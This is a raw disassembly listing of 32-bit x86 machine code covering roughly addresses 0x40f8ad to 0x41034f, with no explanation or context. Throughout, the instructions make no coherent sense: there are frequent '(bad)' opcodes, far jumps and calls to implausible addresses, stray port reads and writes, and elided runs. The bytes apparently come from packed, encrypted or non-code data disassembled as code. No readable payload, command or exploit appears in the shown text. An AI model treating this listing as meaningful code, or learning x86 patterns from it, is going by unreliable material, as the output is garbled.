  40f8ad:	cmp    ecx,0xd
  40f8b0:	fisttp QWORD PTR [ecx]
  40f8b2:	fs and bh,0x74
  40f8b6:	push   edx
  40f8b7:	(bad)  
  40f8b9:	and    ecx,0x5b
  40f8bc:	data16 ja 0x40f871
  40f8bf:	cdq    
  40f8c0:	pop    esi
  40f8c1:	jmp    0x17fbd796
  40f8c6:	ins    BYTE PTR es:[edi],dx
  40f8c7:	sub    eax,DWORD PTR [ecx+0x1e]
  40f8ca:	mov    ebx,0xe54458c
  40f8cf:	mov    WORD PTR [ebx-0x1af94eed],?
  40f8d5:	call   0xf5825c0c
  40f8da:	mov    ds:0x5fdc258c,eax
  40f8df:	ficomp DWORD PTR ds:0xe83fa6e9
  40f8e5:	add    edi,DWORD PTR [esi]
  40f8e7:	fisubr WORD PTR [edx+0x3cd6b717]
  40f8ed:	jmp    0xfbc4:0x27698c78
  40f8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8f5:	add    edi,DWORD PTR ds:0x7f5ba706
  40f8fb:	sti    
  40f8fc:	daa    
  40f8fd:	add    al,0x59
  40f8ff:	(bad)  
  40f900:	xchg   esp,eax
  40f901:	jmp    0x59018556
	...
  40f92e:	add    BYTE PTR [eax],al
  40f930:	fistp  DWORD PTR [edx-0x17]
  40f933:	cld    
  40f934:	add    DWORD PTR [edi],0x22d95c14
  40f93a:	sub    BYTE PTR [ecx+esi*1],al
  40f93d:	push   es
  40f93e:	fstp   st(3)
  40f940:	mov    dh,0xd6
  40f942:	lods   eax,DWORD PTR ds:[esi]
  40f943:	call   0xe99dbf68
  40f948:	sbb    BYTE PTR [eax+edi*1-0x6a291124],cl
  40f94f:	call   0x428fccd
  40f954:	adc    ebp,ecx
  40f956:	sbb    cl,ch
  40f958:	jb     0x40f9bd
  40f95a:	xchg   ecx,eax
  40f95b:	(bad)  
  40f95c:	fwait
  40f95d:	mov    edi,edi
  40f95f:	jne    0x40f966
  40f961:	mov    ds:0x82d66e7f,al
  40f966:	shr    ecx,cl
  40f968:	cmp    eax,0x5d33685b
  40f96d:	sbb    al,BYTE PTR [eax]
  40f96f:	push   esi
  40f970:	cwde   
  40f971:	(bad)  
  40f972:	std    
  40f973:	dec    esi
  40f974:	(bad)  
  40f975:	jae    0x40f99f
  40f977:	aam    0x3d
  40f979:	pop    ebx
  40f97a:	or     ebp,DWORD PTR [ecx]
  40f97c:	and    DWORD PTR ds:0x1a655668,edi
  40f982:	add    BYTE PTR [esi],ch
  40f984:	adc    BYTE PTR [edi-0x18],ah
  40f987:	stos   BYTE PTR es:[edi],al
  40f988:	sbb    DWORD PTR [ebp-0x381fe102],ecx
  40f98e:	std    
  40f98f:	push   ss
  40f990:	xchg   esi,eax
  40f991:	sbb    ebp,eax
  40f993:	bound  eax,QWORD PTR [eax]
	...
  40f9bd:	add    BYTE PTR [ecx],al
  40f9bf:	(bad)  
  40f9c0:	(bad)  
  40f9c1:	cdq    
  40f9c2:	pushw  es
  40f9c4:	adc    dh,bh
  40f9c6:	jecxz  0x40fa26
  40f9c8:	push   eax
  40f9c9:	neg    bl
  40f9cb:	(bad)  
  40f9cc:	call   0xfecd4f2d
  40f9d1:	sar    DWORD PTR [ebp+0x59deff0b],1
  40f9d7:	(bad)  
  40f9d8:	mov    bl,0xd7
  40f9da:	popa   
  40f9db:	mov    edi,fs
  40f9dd:	pop    ds
  40f9de:	in     eax,0x5a
  40f9e0:	add    BYTE PTR [edx+0x2a],ch
  40f9e3:	pop    ebp
  40f9e4:	jb     0x40f9bb
  40f9e6:	mov    ah,0xef
  40f9e8:	mov    bl,0xb7
  40f9ea:	and    DWORD PTR [edx+0x74bd9902],ecx
  40f9f0:	add    DWORD PTR [edi],ecx
  40f9f2:	ret    
  40f9f3:	inc    esp
  40f9f4:	sbb    cl,BYTE PTR cs:[edi+0x6a29eb5d]
  40f9fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9fc:	pop    edi
  40f9fd:	sub    BYTE PTR [edx],bh
  40f9ff:	mov    dh,BYTE PTR [eax+eax*1-0x27ec5]
  40fa06:	iret   
  40fa07:	sahf   
  40fa08:	push   0x0
  40fa0a:	xlat   BYTE PTR ds:[ebx]
  40fa0b:	cs push 0x2037e5
  40fa11:	(bad)  
  40fa12:	mov    edx,0x70fffccb
  40fa17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa18:	mov    al,0x6c
  40fa1a:	xlat   BYTE PTR ds:[ebx]
  40fa1b:	pop    esi
  40fa1c:	push   eax
  40fa1d:	push   0x40ff65
	...
  40fa4a:	add    BYTE PTR [eax],al
  40fa4c:	add    ah,cl
  40fa4e:	mov    dl,0xfe
  40fa50:	jo     0x40f9d4
  40fa52:	out    0xa1,al
  40fa54:	sbb    DWORD PTR [esi+0x0],0x5a
  40fa58:	into   
  40fa59:	test   DWORD PTR [esi-0x2f7a708b],edi
  40fa5f:	jne    0x40f9fc
  40fa61:	test   edi,eax
  40fa63:	je     0x40f9e6
  40fa65:	es lahf 
  40fa67:	dec    eax
  40fa68:	(bad)  
  40fa69:	pop    esi
  40fa6a:	push   DWORD PTR [ebp-0x65]
  40fa6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa6e:	scas   eax,DWORD PTR es:[edi]
  40fa6f:	xor    DWORD PTR [eax-0x7f],0xfffffffd
  40fa73:	mov    ch,0x2b
  40fa75:	cmp    ebp,0xf7a6c7ff
  40fa7b:	and    DWORD PTR [eax-0x7f],0x4e
  40fa7f:	(bad)  
  40fa80:	jmp    0xff2e:0x6375ff6e
  40fa87:	jne    0x40fae8
  40fa89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa8a:	data16 cli 
  40fa8c:	add    BYTE PTR [ecx-0x7d8f0e1a],al
  40fa92:	std    
  40fa93:	lea    ebx,[edx-0x2f000364]
  40fa99:	sub    eax,0x80a3b5ff
  40fa9e:	std    
  40fa9f:	jmp    FWORD PTR [edi+0x3e006b12]
  40faa5:	je     0x40fb26
  40faa7:	mov    edi,0xfe1fff31
  40faac:	stc    
  40faad:	loopne 0x40fa94
  40faaf:	mov    ah,0x0
	...
  40fad9:	add    BYTE PTR [edx-0x290119f7],dh
  40fadf:	arpl   WORD PTR [ebx+0x0],bx
  40fae2:	ds stc 
  40fae4:	scas   eax,DWORD PTR es:[edi]
  40fae5:	mov    bh,0xd8
  40fae7:	add    dh,ah
  40fae9:	out    0xff,eax
  40faeb:	test   al,0xe5
  40faed:	(bad)  
  40faee:	div    DWORD PTR ds:0xfd6b0013
  40faf4:	(bad)  
  40faf5:	(bad)  
  40faf6:	xor    edx,DWORD PTR [eax+0x494e74e5]
  40fafc:	jo     0x40fb0a
  40fafe:	test   eax,0x2be7fac6
  40fb03:	aaa    
  40fb04:	out    0xfe,al
  40fb06:	xchg   DWORD PTR ds:0xceafff7,esi
  40fb0c:	xlat   BYTE PTR ds:[ebx]
  40fb0d:	add    BYTE PTR [edx+0xbff4e63],0xa8
  40fb14:	fidivr DWORD PTR [edx+0xae660c2]
  40fb1a:	jle    0x40fb2a
  40fb1c:	add    BYTE PTR [edi+0x77],bl
  40fb1f:	xor    eax,0xe60fff7
  40fb24:	adc    ebp,eax
  40fb26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb27:	mul    esp
  40fb29:	inc    BYTE PTR [ebp-0x4c]
  40fb2c:	outs   dx,BYTE PTR ds:[esi]
  40fb2d:	add    eax,0xbc1bae9
  40fb32:	ds cdq 
  40fb34:	outs   dx,BYTE PTR ds:[esi]
  40fb35:	or     al,0x26
  40fb37:	mov    bh,0x79
  40fb39:	(bad)  
  40fb3a:	xor    DWORD PTR [esi+0x74c2],ecx
	...
  40fb68:	cmp    DWORD PTR [edx],ebx
  40fb6a:	test   DWORD PTR [edi+0x7f],eax
  40fb6d:	jb     0x40fb52
  40fb6f:	je     0x40fbbb
  40fb71:	pop    ebx
  40fb72:	xchg   ecx,eax
  40fb73:	add    bh,BYTE PTR [ebp+0x37d99d88]
  40fb79:	cmc    
  40fb7a:	call   0x81988663
  40fb7f:	out    dx,al
  40fb80:	mov    edi,0x7a7b8588
  40fb85:	(bad)  
  40fb86:	adc    BYTE PTR [edx-0x1b16e577],dl
  40fb8c:	push   0xffffff8f
  40fb8e:	sbb    dh,0xbf
  40fb91:	mov    BYTE PTR [ebp+0x7b],ah
  40fb94:	jp     0x40fb19
  40fb96:	rcr    cl,1
  40fb98:	retf   0xe95b
  40fb9b:	fld    TBYTE PTR [esi+0x8]
  40fb9e:	dec    esi
  40fb9f:	in     eax,0xc6
  40fba1:	push   ds
  40fba2:	inc    ebp
  40fba3:	pop    esp
  40fba4:	ds imul ebp,ecx,0x3
  40fba8:	xchg   esi,eax
  40fba9:	pop    ds
  40fbaa:	mov    dh,0xe4
  40fbac:	mov    al,ds:0x98f3a3d2
  40fbb1:	push   cs
  40fbb2:	and    esp,ebx
  40fbb4:	nop
  40fbb5:	fcomp  QWORD PTR ds:0xe59b34e5
  40fbbb:	jg     0x40fb7f
  40fbbd:	pop    ebx
  40fbbe:	jmp    0x14f74c6
  40fbc3:	pop    esp
  40fbc4:	data16 xchg al,ch
  40fbc7:	add    ebp,DWORD PTR [ecx+0xe]
  40fbca:	cmc    
  40fbcb:	fild   DWORD PTR [eax]
	...
  40fbf5:	add    BYTE PTR [ebx-0x42fc170b],ah
  40fbfb:	sub    edx,0xfffffff4
  40fbfe:	mov    ebx,0x3e03e8bf
  40fc03:	aam    0x53
  40fc05:	call   0xf52a43cb
  40fc0a:	mov    ebp,0x3e03e8e2
  40fc0f:	repz pop ebp
  40fc11:	arpl   WORD PTR [edi+0x5b],di
  40fc14:	add    BYTE PTR [esi],bl
  40fc16:	add    ah,BYTE PTR [esi]
  40fc18:	imul   ebp,ecx,0x3d
  40fc1b:	push   esp
  40fc1c:	rcr    BYTE PTR ds:0xa17488a3,0x65
  40fc23:	mov    BYTE PTR [esi],cl
  40fc25:	jmp    0x99b58467
  40fc2a:	xchg   ebp,eax
  40fc2b:	mov    edx,0xf33a2847
  40fc30:	mov    cl,0x9
  40fc32:	jge    0x40fc8f
  40fc34:	push   edi
  40fc35:	sub    DWORD PTR [esi-0xb],0xc7d6e8ff
  40fc3c:	jae    0x40fbff
  40fc3e:	fimul  DWORD PTR [esi]
  40fc40:	clc    
  40fc41:	sar    DWORD PTR [ebx+esi*8],cl
  40fc44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc45:	leave  
  40fc46:	jl     0x40fca3
  40fc48:	push   edi
  40fc49:	inc    ecx
  40fc4a:	sub    al,0xf5
  40fc4c:	(bad)  
  40fc4d:	call   0xb4418c10
  40fc52:	pop    eax
  40fc53:	mov    BYTE PTR [ecx+edi*1-0x66],dh
  40fc57:	push   cs
  40fc58:	hlt    
  40fc59:	inc    ecx
	...
  40fc82:	add    BYTE PTR [eax],al
  40fc84:	pop    ebx
  40fc85:	(bad)  
  40fc87:	es in  eax,dx
  40fc89:	ror    edi,cl
  40fc8b:	adc    al,BYTE PTR [edi+eax*1+0x5c10c63a]
  40fc92:	(bad)  
  40fc93:	jmp    0x40fc96
  40fc95:	sbb    eax,0x5de11b0b
  40fc9a:	add    bl,0x3d
  40fc9d:	push   cs
  40fc9e:	out    dx,al
  40fc9f:	not    bl
  40fca1:	push   0x50
  40fca3:	out    dx,al
  40fca4:	jmp    0x40fcf8
  40fca6:	call   0xfec95959
  40fcab:	rcr    ebp,1
  40fcad:	or     bh,bh
  40fcaf:	(bad)  
  40fcb0:	push   ecx
  40fcb1:	push   ebp
  40fcb2:	call   DWORD PTR [edx+esi*1-0x7a]
  40fcb6:	je     0x40fcb8
  40fcb8:	idiv   DWORD PTR [edx+0x73]
  40fcbb:	or     BYTE PTR [edi],cl
  40fcbd:	out    dx,al
  40fcbe:	cld    
  40fcbf:	(bad)  
  40fcc0:	call   0x8f012e40
  40fcc5:	jp     0x40fcc4
  40fcc7:	(bad)  
  40fcc8:	fsubr  DWORD PTR [ebp+0x6a2038ac]
  40fcce:	test   DWORD PTR [eax-0x58],ebp
  40fcd1:	jp     0x40fcd0
  40fcd3:	call   DWORD PTR [edx-0x5d]
  40fcd6:	out    0x55,al
  40fcd8:	cmp    DWORD PTR [edx-0x3],edi
  40fcdb:	push   edx
  40fcdd:	stos   BYTE PTR es:[edi],al
  40fcde:	out    0x4d,al
  40fce0:	jmp    0xd340fa5e
  40fce5:	mov    ds:0x45e6,al
	...
  40fd12:	fnstcw WORD PTR [ecx-0x3]
  40fd15:	push   edx
  40fd17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd18:	out    0x3d,al
  40fd1a:	jmp    0x9340fa98
  40fd1f:	mov    bh,ch
  40fd21:	jne    0x40fcce
  40fd23:	jns    0x40fd98
  40fd25:	or     BYTE PTR [edi],cl
  40fd27:	sub    eax,0x1a68fffe
  40fd2c:	leave  
  40fd2d:	ret    0x5a7b
  40fd30:	push   ebp
  40fd31:	mov    ebp,DWORD PTR [ebx]
  40fd33:	faddp  st(2),st
  40fd35:	call   0xff552162
  40fd3a:	mov    ds:0xbd8de68a,al
  40fd3f:	pop    edx
  40fd40:	add    BYTE PTR [ebx],cl
  40fd42:	daa    
  40fd43:	and    edx,DWORD PTR [edi+0x6a]
  40fd46:	push   edi
  40fd47:	repnz mov dh,0x60
  40fd4a:	xchg   esi,eax
  40fd4b:	pop    edx
  40fd4c:	push   DWORD PTR [ebp+0x77]
  40fd4f:	jns    0x40fdc4
  40fd51:	or     al,0x6f
  40fd53:	test   DWORD PTR [edi-0x1],edi
  40fd56:	push   0x3e74c055
  40fd5b:	xor    esi,DWORD PTR [eax+edx*2]
  40fd5e:	es mov edx,0x8931fe89
  40fd64:	ret    0x6f73
  40fd67:	or     ecx,DWORD PTR [eax-0x18]
  40fd6a:	xchg   esp,eax
  40fd6b:	stos   BYTE PTR es:[edi],al
  40fd6c:	jmp    0xfe0a:0xe1b4bc41
  40fd73:	addr16 (bad) 
  40fd75:	inc    BYTE PTR [eax]
	...
  40fd9f:	add    BYTE PTR [ebx-0x1117cba4],dl
  40fda5:	repnz loope 0x40fda6
  40fda8:	mov    ss,ebp
  40fdaa:	push   edi
  40fdab:	call   0x898db3e
  40fdb0:	(bad)  
  40fdb1:	test   al,0xe0
  40fdb3:	(bad)  
  40fdb4:	loope  0x40fd91
  40fdb6:	int    0x7c
  40fdb8:	fxtract 
  40fdba:	loope  0x40fe30
  40fdbc:	out    0x2b,al
  40fdbe:	(bad)  
  40fdbf:	jl     0x40fd8a
  40fdc1:	and    al,0xeb
  40fdc3:	mov    ebp,0x67e22d43
  40fdc8:	ds jl  0x40fdcd
  40fdcb:	add    BYTE PTR [esi-0x56009fb8],ah
  40fdd1:	or     cl,BYTE PTR [eax-0x8]
  40fdd4:	mov    bl,0xb6
  40fdd6:	fimul  WORD PTR [edi-0x67]
  40fdd9:	into   
  40fdda:	repnz dec BYTE PTR [ebx]
  40fddd:	nop
  40fdde:	jmp    0x7e0b:0x27417d3
  40fde5:	out    0x52,al
  40fde7:	mov    DWORD PTR [ebx],0x3e000364
  40fded:	je     0x40fdb8
  40fdef:	inc    esp
  40fdf0:	jb     0x40fd76
  40fdf2:	or     BYTE PTR [eax],al
  40fdf4:	fiadd  DWORD PTR ds:[edx]
  40fdf7:	push   0x3e
  40fdf9:	fiadd  DWORD PTR [edx]
  40fdfb:	push   0x3e
  40fdfd:	pop    ebx
  40fdfe:	je     0x40fe47
  40fe00:	push   edx
  40fe01:	sub    bl,dh
  40fe03:	push   edi
	...
  40fe2c:	add    BYTE PTR [eax],al
  40fe2e:	inc    esi
  40fe2f:	test   DWORD PTR [ebx-0x2c],ebx
  40fe32:	cmp    BYTE PTR [edi],cl
  40fe34:	int    0xec
  40fe36:	jecxz  0x40fe2a
  40fe38:	call   0x34dc3340
  40fe3d:	push   es
  40fe3e:	adc    eax,0x81814142
  40fe43:	sbb    ch,cl
  40fe45:	loopne 0x40fdd1
  40fe47:	imul   edx,DWORD PTR [ecx-0x627b40fa],0xffffffe1
  40fe4e:	mov    al,BYTE PTR [ebx-0x257513c8]
  40fe54:	(bad)  
  40fe55:	loope  0x40fe1d
  40fe57:	push   ds
  40fe58:	xchg   ebp,eax
  40fe59:	loope  0x40fecd
  40fe5b:	arpl   WORD PTR [esi+0x57],di
  40fe5e:	dec    edx
  40fe5f:	test   bl,bh
  40fe61:	out    dx,eax
  40fe62:	fmul   DWORD PTR [esi]
  40fe64:	fucom  st(0)
  40fe66:	dec    edx
  40fe67:	push   ebx
  40fe68:	push   ecx
  40fe69:	sti    
  40fe6a:	enter  0x5d84,0xe1
  40fe6e:	dec    edx
  40fe6f:	ja     0x40feb1
  40fe71:	sbb    eax,0xe14d843b
  40fe76:	cli    
  40fe77:	mov    dl,BYTE PTR [ecx-0x7f]
  40fe7a:	test   al,0xe
  40fe7c:	cmp    eax,0xe8f207ec
  40fe81:	add    ebx,DWORD PTR [ecx+0x5bec310e]
  40fe87:	push   es
  40fe88:	es loope 0x40ff01
  40fe8b:	cdq    
  40fe8c:	hlt    
  40fe8d:	add    ebp,ebx
  40fe8f:	iret   
  40fe90:	add    al,0x83
	...
  40feba:	add    BYTE PTR [eax],al
  40febc:	jge    0x40fe4d
  40febe:	push   cs
  40febf:	loope  0x40ff31
  40fec1:	icebp  
  40fec2:	call   0x73c52134
  40fec7:	or     edx,DWORD PTR [esi+0x1e]
  40feca:	add    BYTE PTR [ebx+0x5e],dh
  40fecd:	test   DWORD PTR [eax+0x49d71a4],ecx
  40fed3:	jae    0x40feb2
  40fed5:	sbb    DWORD PTR [eax],eax
  40fed7:	jmp    0x64415a19
  40fedc:	ror    BYTE PTR [ebp+edi*8+0x68141ece],0xed
  40fee4:	cmp    al,0x5b
  40fee6:	add    cl,dl
  40fee8:	out    dx,al
  40fee9:	sti    
  40feea:	(bad)  
  40feeb:	call   0x28a22195
  40fef0:	cmp    dh,bl
  40fef2:	push   eax
  40fef3:	or     BYTE PTR [ebp+0x5b],bh
  40fef6:	push   0x1a9d12
  40fefb:	xchg   esi,eax
  40fefc:	push   eax
  40fefd:	cwde   
  40fefe:	inc    edi
  40feff:	sub    BYTE PTR [edx],bh
  40ff01:	test   BYTE PTR [ecx+esi*8-0x2b],dh
  40ff05:	mov    ebx,0xfbde7efd
  40ff0a:	pop    eax
  40ff0b:	or     BYTE PTR [ebp+0x5b],bh
  40ff0e:	push   0x1a5d18
  40ff13:	rcr    DWORD PTR [edx-0x6],1
  40ff16:	inc    eax
  40ff17:	jmp    0xe9415871
  40ff1c:	mov    ebp,0xe17484
	...
  40ff49:	add    BYTE PTR [ebp-0x61b90231],ah
  40ff4f:	(bad)  
  40ff50:	test   BYTE PTR [esi],dh
  40ff52:	lahf   
  40ff53:	test   dh,bh
  40ff55:	cdq    
  40ff56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff57:	sub    ebp,DWORD PTR [eax-0x17]
  40ff5a:	cmp    eax,0x9e257484
  40ff5f:	push   cs
  40ff60:	or     BYTE PTR [ecx],dl
  40ff62:	add    BYTE PTR [ecx],0xff
  40ff65:	push   ss
  40ff66:	test   BYTE PTR [ecx-0x2fd716fd],bl
  40ff6c:	jmp    0x40ff6e
  40ff6e:	(bad)  
  40ff6f:	fwait
  40ff70:	repnz (bad) 
  40ff72:	pusha  
  40ff73:	mov    ds:0x3cbd0068,eax
  40ff78:	push   DWORD PTR [ebp+0x5f]
  40ff7b:	outs   dx,DWORD PTR ds:[esi]
  40ff7c:	mov    esp,0x87a36079
  40ff81:	inc    ebp
  40ff82:	arpl   ax,si
  40ff84:	sbb    eax,ebp
  40ff86:	sti    
  40ff87:	xlat   BYTE PTR ds:[ebx]
  40ff88:	std    
  40ff89:	call   FWORD PTR [edi+ebx*4]
  40ff8c:	jb     0x40ffb2
  40ff8e:	pop    DWORD PTR [eax+0x61]
  40ff91:	inc    ecx
  40ff92:	pop    ss
  40ff93:	dec    edi
  40ff94:	call   0xfde3a6f9
  40ff99:	push   eax
  40ff9a:	jg     0x40fff3
  40ff9c:	adc    bh,ch
  40ff9e:	mov    eax,ds:0x56619cef
  40ffa3:	push   edi
  40ffa4:	push   eax
  40ffa5:	call   FWORD PTR [edx+0x4f]
  40ffa8:	call   0xfde379f8
  40ffad:	call   0x40ffb2
	...
  40ffd6:	add    BYTE PTR [eax],al
  40ffd8:	dec    ebx
  40ffd9:	sti    
  40ffda:	(bad)  
  40ffdb:	call   FWORD PTR [eax+0x26608a54]
  40ffe1:	push   edi
  40ffe2:	add    DWORD PTR [eax],eax
  40ffe4:	out    0x5e,eax
  40ffe6:	lea    eax,[ebp-0x25e98]
  40ffec:	xchg   esi,esi
  40ffee:	add    eax,DWORD PTR [ecx]
  40fff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fff1:	pop    esi
  40fff2:	call   0x9f78f0
  40fff7:	push   0x40f7de
  40fffc:	pop    DWORD PTR [edi+0x61]
  40ffff:	inc    ecx
  410000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410001:	imul   BYTE PTR [edx+0x61]
  410004:	out    0x5e,al
  410006:	push   DWORD PTR ds:0x410f54
  41000c:	and    BYTE PTR [eax+ecx*1],ah
  41000f:	call   0xff226652
  410014:	jno    0x40fff2
  410016:	cmp    esp,DWORD PTR [ecx-0x1]
  410019:	jae    0x410085
  41001b:	push   ecx
  41001c:	fbstp  TBYTE PTR [edx-0x2d1a97fe]
  410022:	inc    ebx
  410023:	add    dh,ah
  410025:	jne    0x410029
  410027:	add    BYTE PTR [esi+0x56085779],bh
  41002d:	retf   0xfedf
  410030:	cmp    edi,esi
  410032:	xchg   esi,esi
  410034:	xor    BYTE PTR [ecx-0x29e9b023],dl
  41003a:	add    BYTE PTR gs:[eax],al
	...
  410065:	add    BYTE PTR [esi],bh
  410067:	rcl    DWORD PTR [edi-0x4],0x19
  41006b:	aas    
  41006c:	or     al,0xe8
  41006e:	cdq    
  41006f:	dec    ebx
  410070:	(bad)  
  410072:	div    DWORD PTR [ebp+0xd6b0006]
  410078:	out    dx,eax
  410079:	add    BYTE PTR [edx],0xe0
  41007c:	fdiv   st(6),st
  41007e:	icebp  
  41007f:	pop    ebp
  410080:	add    al,0x6a
  410082:	and    cl,bl
  410084:	push   edi
  410085:	or     dh,dl
  410087:	mov    ebx,DWORD PTR [ebx-0x1]
  41008a:	fsqrt  
  41008c:	inc    edi
  41008d:	cld    
  41008e:	stc    
  41008f:	jbe    0x410019
  410091:	pop    edi
  410092:	jg     0x410108
  410094:	add    al,BYTE PTR [eax]
  410096:	ds je  0x410028
  410099:	test   BYTE PTR [ecx+0xefede29],dh
  41009f:	pushf  
  4100a0:	push   es
  4100a1:	add    DWORD PTR [esi],edi
  4100a3:	je     0x41008f
  4100a5:	jno    0x4100c0
  4100a7:	je     0x4100ab
  4100a9:	push   0x4392d6
  4100ae:	add    ah,BYTE PTR es:[ecx+eax*2+0x3e]
  4100b3:	pop    ebx
  4100b4:	xchg   ecx,eax
  4100b5:	push   0x1f
  4100b7:	sbb    al,0xe9
  4100b9:	fidiv  WORD PTR [edx]
  4100bb:	sahf   
  4100bc:	mov    al,ds:0x93823e44
  4100c1:	or     edx,DWORD PTR [esi-0xb]
  4100c4:	add    ebx,esi
  4100c6:	pusha  
  4100c7:	repnz inc eax
  4100c9:	add    BYTE PTR fs:[eax],al
	...
  4100f4:	call   FWORD PTR [edx-0x7f]
  4100f7:	lods   eax,DWORD PTR ds:[esi]
  4100f8:	ficomp WORD PTR [ebx]
  4100fa:	jmp    0x283cd66a
  4100ff:	add    al,0xd6
  410101:	pop    esp
  410102:	jmp    0x5bc1bf0a
  410107:	or     al,0x26
  410109:	adc    esp,ecx
  41010b:	(bad)  [eax]
  41010d:	iret   
  41010e:	imul   edx,ebp,0x23
  410111:	cmp    DWORD PTR [ebp+0x4e652634],0x33803e04
  41011b:	loopne 0x410125
  41011d:	pop    es
  41011e:	icebp  
  41011f:	jmp    0x410102
  410121:	add    ebx,DWORD PTR [esi-0x1361f923]
  410127:	add    ecx,DWORD PTR [ebx-0x27c832c]
  41012d:	xchg   DWORD PTR [esi-0x170a1f23],eax
  410133:	imul   esp,DWORD PTR [ecx],0xe60bfb80
  410139:	(bad)  
  41013b:	fmul   st(0),st
  41013d:	shr    BYTE PTR [ebx+0x7356f8df],cl
  410143:	call   FWORD PTR fs:[edx-0x17]
  410147:	add    edi,DWORD PTR [esi]
  410149:	pop    ebx
  41014a:	pop    esp
  41014b:	xchg   DWORD PTR [eax-0xe22ba7f],esi
  410151:	repnz in al,0x2
  410154:	ds pop ebx
  410156:	add    BYTE PTR [ecx+0x0],al
	...
  410181:	add    BYTE PTR [edi+0x15e8fff6],ah
  410187:	lods   eax,DWORD PTR ds:[esi]
  410188:	pusha  
  410189:	test   al,0x3d
  41018b:	repz retf 
  41018d:	mov    ah,bh
  41018f:	pop    edx
  410190:	push   0x19dc82
  410195:	push   cs
  410196:	push   ecx
  410197:	pushf  
  410198:	inc    edi
  410199:	test   al,0x3d
  41019b:	xor    BYTE PTR [ecx+esi*8+0x65],0x7c
  4101a0:	sti    
  4101a1:	div    BYTE PTR [edx-0x8]
  4101a4:	ror    DWORD PTR [eax-0x4a97a504],1
  4101aa:	fcomp  QWORD PTR [ecx]
  4101ac:	add    BYTE PTR [ecx-0x59],dl
  4101af:	cli    
  4101b0:	inc    eax
  4101b1:	jmp    0xe9415f5b
  4101b6:	mov    ebp,0x15f17480
  4101bb:	cwde   
  4101bc:	sti    
  4101bd:	mov    esi,0xbe84cefa
  4101c2:	repz cmp dh,0x19
  4101c6:	sbb    ch,ah
  4101c8:	gs jmp 0x9db5820b
  4101ce:	sbb    al,BYTE PTR [edi]
  4101d0:	or     BYTE PTR [ecx-0x7100fccc],al
  4101d6:	hlt    
  4101d7:	cdq    
  4101d8:	add    ebp,ecx
  4101da:	sub    ah,dl
  4101dc:	jmp    0x410246
  4101de:	add    DWORD PTR [ebp+edi*8-0xe0d8a],ecx
  4101e5:	add    al,BYTE PTR [eax]
	...
  41020f:	add    BYTE PTR [edx],bl
  410211:	xor    BYTE PTR [ecx+esi*8-0x2b],0x81
  410216:	jbe    0x410276
  410218:	call   0x8a56:0x7a5544d2
  41021f:	leave  
  410220:	cld    
  410221:	pop    edx
  410222:	add    BYTE PTR [eax],al
  410224:	xchg   edi,eax
  410225:	pop    ebx
  410226:	add    BYTE PTR [ebp-0x358de],cl
  41022c:	dec    eax
  41022d:	dec    esp
  41022e:	push   0x5b9604
  410233:	call   0x40f7eb
  410238:	iret   
  410239:	jno    0x41029a
  41023b:	inc    ecx
  41023c:	addr16 repz loope 0x4102a1
  410240:	xchg   esi,eax
  410241:	pop    ebx
  410242:	push   0x1cb66b
  410247:	call   DWORD PTR [edx+0x6741469a]
  41024d:	sahf   
  41024e:	jae    0x410258
  410250:	aas    
  410251:	inc    ecx
  410252:	cld    
  410253:	call   FWORD PTR [eax-0x12]
  410256:	jmp    0x689868bc
  41025b:	loop   0x4101e3
  41025d:	sbb    BYTE PTR [eax],al
  41025f:	push   0x40f87c
  410264:	(bad)  
  410265:	push   ebp
  410266:	add    BYTE PTR [eax],al
  410268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410269:	mov    ds:0x18ff0873,al
  41026e:	cld    
  41026f:	(bad)  
  410270:	fcom   st(4)
  410272:	xor    edi,0x0
	...
  41029d:	add    cl,bl
  41029f:	mov    ds:0x54cf50fd,al
  4102a4:	data16 add bh,ah
  4102a7:	mov    eax,ds:0x2cb8fc73
  4102ac:	or     al,ch
  4102ae:	lds    ebp,FWORD PTR [edx]
  4102b0:	(bad)  
  4102b1:	dec    DWORD PTR [esi+0x32000295]
  4102b7:	into   
  4102b8:	jmp    0xed00:0x68a3a383
  4102bf:	das    
  4102c0:	push   DWORD PTR [ebp-0x51]
  4102c3:	jb     0x410339
  4102c5:	ja     0x410305
  4102c7:	and    eax,0x100388db
  4102cc:	outs   dx,BYTE PTR ds:[esi]
  4102cd:	add    BYTE PTR [esi],dl
  4102cf:	test   DWORD PTR [ecx+eax*2+0x3e],esp
  4102d3:	lods   al,BYTE PTR ds:[esi]
  4102d4:	xlat   BYTE PTR ds:[ebx]
  4102d5:	pusha  
  4102d6:	push   DWORD PTR [ebx-0x27]
  4102d9:	xor    al,0x7d
  4102db:	mov    esp,0x78960043
  4102e0:	push   edi
  4102e1:	(bad)  
  4102e2:	jns    0x41026d
  4102e4:	ret    0x5773
  4102e7:	les    ebp,FWORD PTR [edx+0x0]
  4102ea:	ds jge 0x410285
  4102ed:	addr16 inc ecx
  4102ef:	rol    BYTE PTR [ebx+0x0],cl
  4102f2:	out    dx,al
  4102f3:	jl     0x410344
  4102f5:	or     BYTE PTR [esi-0x7a],ah
  4102f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102f9:	dec    BYTE PTR [ecx+0x5c]
  4102fc:	add    edi,DWORD PTR [edx+0x41]
  4102ff:	jne    0x41036d
	...
  410329:	add    BYTE PTR [eax],al
  41032b:	add    BYTE PTR [esi+0x3e416486],ah
  410331:	sbb    al,0xd9
  410333:	pusha  
  410334:	jg     0x4103aa
  410336:	fnstenv [edi*8+0x2600454b]
  41033d:	mov    WORD PTR [edi-0x1],ss
  410340:	adc    DWORD PTR [ecx-0x3e],edi
  410343:	jae    0x41036c
  410345:	fs ins BYTE PTR es:[edi],dx
  410347:	add    BYTE PTR [esi],bh
  410349:	in     eax,0x98
  41034b:	addr16 pop ecx
  41034d:	push   edx
  41034e:	inc    ebp
  41034f:	add    BYTE PTR [esi-0x29f7b01b],cl
